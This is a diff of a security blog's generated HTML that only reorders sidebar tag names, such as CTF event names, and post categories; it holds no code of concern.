-        <span class="sidebar-tag-name" data-tags="0CTF"><span class="iconfont-archer">&#xe606;</span>0CTF</span>
-    
-        <span class="sidebar-tag-name" data-tags="ASIS"><span class="iconfont-archer">&#xe606;</span>ASIS</span>
-    
-        <span class="sidebar-tag-name" data-tags="SECCON"><span class="iconfont-archer">&#xe606;</span>SECCON</span>
-    
-        <span class="sidebar-tag-name" data-tags="RealWorldCTF"><span class="iconfont-archer">&#xe606;</span>RealWorldCTF</span>
-    
-        <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
-    
-        <span class="sidebar-tag-name" data-tags="Plaid"><span class="iconfont-archer">&#xe606;</span>Plaid</span>
-    
-        <span class="sidebar-tag-name" data-tags="CONFidence"><span class="iconfont-archer">&#xe606;</span>CONFidence</span>
-    
-        <span class="sidebar-tag-name" data-tags="Pragyan"><span class="iconfont-archer">&#xe606;</span>Pragyan</span>
-    
-        <span class="sidebar-tag-name" data-tags="Algorithm"><span class="iconfont-archer">&#xe606;</span>Algorithm</span>
-    
         <span class="sidebar-tag-name" data-tags="AIS3"><span class="iconfont-archer">&#xe606;</span>AIS3</span>
     
         <span class="sidebar-tag-name" data-tags="Reversing-kr"><span class="iconfont-archer">&#xe606;</span>Reversing-kr</span>
     
-        <span class="sidebar-tag-name" data-tags="Base64"><span class="iconfont-archer">&#xe606;</span>Base64</span>
-    
-        <span class="sidebar-tag-name" data-tags="AVX"><span class="iconfont-archer">&#xe606;</span>AVX</span>
+        <span class="sidebar-tag-name" data-tags="Algorithm"><span class="iconfont-archer">&#xe606;</span>Algorithm</span>
     
         <span class="sidebar-tag-name" data-tags="OS"><span class="iconfont-archer">&#xe606;</span>OS</span>
     
@@ -1276,7 +1282,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="GIF"><span class="iconfont-archer">&#xe606;</span>GIF</span>
     
-        <span class="sidebar-tag-name" data-tags="Windows"><span class="iconfont-archer">&#xe606;</span>Windows</span>
+        <span class="sidebar-tag-name" data-tags="Base64"><span class="iconfont-archer">&#xe606;</span>Base64</span>
+    
+        <span class="sidebar-tag-name" data-tags="AVX"><span class="iconfont-archer">&#xe606;</span>AVX</span>
     
         <span class="sidebar-tag-name" data-tags="browser"><span class="iconfont-archer">&#xe606;</span>browser</span>
     
@@ -1284,7 +1292,25 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="JIT"><span class="iconfont-archer">&#xe606;</span>JIT</span>
     
+        <span class="sidebar-tag-name" data-tags="Windows"><span class="iconfont-archer">&#xe606;</span>Windows</span>
+    
         <span class="sidebar-tag-name" data-tags="Cryptography"><span class="iconfont-archer">&#xe606;</span>Cryptography</span>
+    
+        <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
+    
+        <span class="sidebar-tag-name" data-tags="SECCON"><span class="iconfont-archer">&#xe606;</span>SECCON</span>
+    
+        <span class="sidebar-tag-name" data-tags="0CTF"><span class="iconfont-archer">&#xe606;</span>0CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="ASIS"><span class="iconfont-archer">&#xe606;</span>ASIS</span>
+    
+        <span class="sidebar-tag-name" data-tags="RealWorldCTF"><span class="iconfont-archer">&#xe606;</span>RealWorldCTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="Plaid"><span class="iconfont-archer">&#xe606;</span>Plaid</span>
+    
+        <span class="sidebar-tag-name" data-tags="CONFidence"><span class="iconfont-archer">&#xe606;</span>CONFidence</span>
+    
+        <span class="sidebar-tag-name" data-tags="Pragyan"><span class="iconfont-archer">&#xe606;</span>Pragyan</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -1321,13 +1347,13 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="WriteUp"><span class="iconfont-archer">&#xe60a;</span>WriteUp</span>
     
-        <span class="sidebar-category-name" data-categories="Reminder"><span class="iconfont-archer">&#xe60a;</span>Reminder</span>
+        <span class="sidebar-category-name" data-categories="Misc"><span class="iconfont-archer">&#xe60a;</span>Misc</span>
     
         <span class="sidebar-category-name" data-categories="Note"><span class="iconfont-archer">&#xe60a;</span>Note</span>
     
-        <span class="sidebar-category-name" data-categories="Misc"><span class="iconfont-archer">&#xe60a;</span>Misc</span>
-    
         <span class="sidebar-category-name" data-categories="TodayILearn"><span class="iconfont-archer">&#xe60a;</span>TodayILearn</span>
+    
+        <span class="sidebar-category-name" data-categories="Reminder"><span class="iconfont-archer">&#xe60a;</span>Reminder</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
